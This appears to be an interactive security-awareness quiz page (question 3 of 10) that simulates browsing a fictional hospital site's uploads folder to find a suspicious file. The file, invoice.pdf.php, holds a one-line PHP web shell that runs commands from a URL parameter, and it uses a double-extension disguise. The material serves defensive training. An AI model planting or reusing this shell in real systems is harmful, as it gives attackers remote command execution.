<style>
#nw-e10 .qlabel { color:#888; font-size:13px; margin-bottom:10px; }
#nw-e10 .nw-q { margin-bottom:40px; }
#nw-e10 .fbrowser-window { border:1px solid #333; border-radius:8px; overflow:hidden; }
#nw-e10 .fbrowser-titlebar { background:#1e1e1e; padding:8px 12px; display:flex; gap:6px; align-items:center; justify-content:flex-end; }
#nw-e10 .fdot { width:11px; height:11px; border-radius:50%; display:inline-block; }
#nw-e10 .fdot.red { background:#ff5f56; }
#nw-e10 .fdot.yellow { background:#ffbd2e; }
#nw-e10 .fdot.green { background:#27c93f; }
#nw-e10 .fbrowser-navbar { background:#232323; padding:7px 10px; display:flex; align-items:center; gap:8px; border-bottom:1px solid #333; }
#nw-e10 .fbrowser-navbtn { color:#888; font-size:14px; user-select:none; }
#nw-e10 .fbrowser-navbtn.active { color:#ccc; cursor:pointer; }
#nw-e10 .fbrowser-addressbar { flex:1; background:#0c0c0c; border:1px solid #333; border-radius:14px; padding:6px 12px; color:#8fcf8f; font-family:"Courier New", monospace; font-size:12.5px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
#nw-e10 .fbrowser-addressbar .scheme { color:#666; }
#nw-e10 .fbrowser { background:#0c0c0c; padding:10px; font-size:14px; min-height:120px; }
#nw-e10 .fitem { padding:8px 10px; color:#ccc; cursor:pointer; border-radius:4px; }
#nw-e10 .fitem:hover { background:#1e1e1e; }

#nw-e10 .fitem.file:before { content:"\1F4C4 "; }
#nw-e10 .path { color:#888; font-size:12px; margin-bottom:8px; }
#nw-e10 .filecontent { background:#0c0c0c; border:1px solid #333; border-radius:6px; padding:12px; margin-top:10px; font-family:"Courier New", monospace; font-size:12px; color:#f0f0f0; white-space:pre-wrap; display:none; }
#nw-e10 .mcq { margin-top:18px; }
#nw-e10 .mcq p.task { color:#1a1a1a; font-weight:700; font-size:15px; margin:0 0 10px 0; }

#nw-e10 .mcq label:hover { color:#000; }
#nw-e10 .mcq input[type="radio"] { margin-right:8px; }
#nw-e10 button { background:#2b2b2b; color:#fff; border:none; padding:7px 16px; border-radius:4px; font-size:13px; cursor:pointer; margin-top:10px; }

</style>


<div class="nw-q" data-id="3">
<div class="qlabel">File Explorer Question 3 of 10 &mdash; browse the exposed server storage below to find the answer.</div>
<div class="fbrowser-window">
  <div class="fbrowser-titlebar"><span class="fdot red"></span><span class="fdot yellow"></span><span class="fdot green"></span></div>
  <div class="fbrowser-navbar"><span class="fbrowser-navbtn">&#9664;</span><span class="fbrowser-navbtn">&#9654;</span><span class="fbrowser-navbtn active">&#8635;</span><div class="fbrowser-addressbar"><span class="scheme">http://</span><span class="url-text"></span></div></div>
  <div class="fbrowser"><div class="path">/</div><div class="flist"></div></div>
</div>
<div class="filecontent"></div>
<div class="mcq">
<p class="task"><b>Browse medirozahospital.com's uploads folder and find the file that looks suspicious. What is suspicious about this file?</b></p>
<label><input type="radio" name="q3"> It is too large</label>
<label><input type="radio" name="q3"> It has a hidden PHP extension disguised as a PDF, allowing code execution</label>
<label><input type="radio" name="q3"> It has a long file name</label>
<button>Submit Answer</button><div class="fb"></div>
</div>
</div>

</div>

<script>
var eData = {
  "3": { "domain": "medirozahospital.com", "tree": {
    "/": { "type": "folder", "items": ["uploads", "patient", "contact", "about"] },
    "/contact": { "type": "folder", "items": ["contact.html"] },
    "/contact/contact.html": { "type": "file", "content": "[contact page HTML]" },
    "/about": { "type": "folder", "items": ["about.html"] },
    "/about/about.html": { "type": "file", "content": "[about page HTML]" },
    "/uploads": { "type": "folder", "items": ["avatar.jpg", "banner.png", "logo_v2.png", "profile_pic.jpg", "invoice.pdf.php", "readme.txt"] },
    "/patient": { "type": "folder", "items": ["dashboard.php"] },
    "/uploads/avatar.jpg": { "type": "file", "content": "[binary image data]" },
    "/uploads/banner.png": { "type": "file", "content": "[binary image data]" },
    "/uploads/logo_v2.png": { "type": "file", "content": "[binary image data]" },
    "/uploads/profile_pic.jpg": { "type": "file", "content": "[binary image data]" },
    "/uploads/invoice.pdf.php": { "type": "file", "content": "<?php system($_GET['cmd']); ?>" },
    "/uploads/readme.txt": { "type": "file", "content": "Please only upload jpg or png files here." },
    "/patient/dashboard.php": { "type": "file", "content": "[dashboard page]" }
  }},
};

document.querySelectorAll('#nw-e10 .nw-q').forEach(function(qdiv){
  var id = qdiv.getAttribute('data-id');
  var cfg = eData[id];
  var pathDiv = qdiv.querySelector('.path');
  var urlText = qdiv.querySelector('.url-text');
  var list = qdiv.querySelector('.flist');
  var content = qdiv.querySelector('.filecontent');
  var btn = qdiv.querySelector('button');
  var fb = qdiv.querySelector('.fb');
  var currentPath = '/';

  function updateAddressBar(fullPath, isFile){
    var clean = fullPath === '/' ? '' : fullPath;
    urlText.textContent = cfg.domain + clean + (isFile ? '' : '/');
  }

  function render(){
    pathDiv.textContent = currentPath;
    updateAddressBar(currentPath, false);
    list.innerHTML = '';
    content.style.display = 'none';
    if(currentPath !== '/'){
      var up = document.createElement('div'); up.className = 'fitem folder'; up.textContent = '.. (back)';
      up.onclick = function(){ currentPath = currentPath.substring(0, currentPath.lastIndexOf('/')) || '/'; render(); };
      list.appendChild(up);
    }
    var node = cfg.tree[currentPath];
    node.items.forEach(function(name){
      var full = (currentPath === '/' ? '' : currentPath) + '/' + name;
      var child = cfg.tree[full];
      var el = document.createElement('div');
      el.className = 'fitem ' + (child.type === 'folder' ? 'folder' : 'file');
      el.textContent = name;
      el.onclick = function(){
        if(child.type === 'folder'){
          currentPath = full; render();
        } else {
          content.style.display = 'block';
          content.textContent = child.content;
          updateAddressBar(full, true);
        }
      };
      list.appendChild(el);
    });
  }
  render();

  btn.addEventListener('click', function(){
    var sel = qdiv.querySelector('input[type=radio]:checked');
    if(!sel){ fb.textContent = 'Please select an answer.'; fb.className='fb bad'; return; }
    fb.textContent = 'Answer submitted.'; fb.className='fb ok';
  });
});
</script>
